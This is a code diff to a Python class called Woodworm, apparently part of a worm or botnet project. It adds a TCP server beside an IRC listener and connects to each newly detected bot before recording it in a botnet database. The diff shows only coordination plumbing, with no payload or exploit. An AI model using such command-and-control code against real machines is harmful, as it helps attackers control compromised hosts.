@@ -4,6 +4,7 @@ from irc import irc_service
 from log import logger
 from context import context
 from botnet import botnet_database
+from botnet.tcp import tcp_services
 import socket
 import os
 import datetime
@@ -20,10 +21,11 @@ class Woodworm:
         self.ircServerPort = ircServerPort
         self.my_ip = socket.gethostbyname(socket.gethostname())
         self.tcpPort = tcpPort
-        
+
         self.myContext = context.Context(self.ircNick, self.my_ip, self.tcpPort)
         self.myContext.set_connected(True)
-        
+
+        self.tcp_server = tcp_services.TCPServer(self.my_ip, self.tcpPort)        
         self.irc_connection = irc_service.IRCConnection(self.ircServer, self.domain, self.ircServerPort, self.ircNick, self.channel)
         
         self.irc_connection.onConnected.subscribe(self.irc_onConnected)
@@ -41,9 +43,10 @@ class Woodworm:
         if not debug:
             async with asyncio.TaskGroup() as tg:
                 tg.create_task(self.irc_connection.listen())
-                tg.create_task(self.another_loop())
+                tg.create_task(self.tcp_server.start())
         else:
             await self.irc_connection.listen()
+            await self.tcp_server.start()
 
 
     async def irc_onConnected(self, *args, **kwargs):
@@ -66,7 +69,10 @@ class Woodworm:
         self.syslog.log(f"SPREAD DETECTED: nick:{nick}, ip:{ip} port:{port}", level=logger.LogLevel.DEBUG)
 
         if self.botnetDB.get_bot(nick) is None:
-            self.botnetDB.add_bot(context.Context(nick, ip, port))
+            bot = context.Context(nick, ip, port)
+            bot.set_connected(bot.get_tcp_client().connect())
+            self.botnetDB.add_bot(bot)
+            
             self.syslog.log(f"Bot added to DB: nick: {nick}, ip: {ip} port: {port}", level=logger.LogLevel.INFO)
             self.syslog.log(f"Number of bots: {len(self.botnetDB.get_bots())}", level=logger.LogLevel.INFO)
 
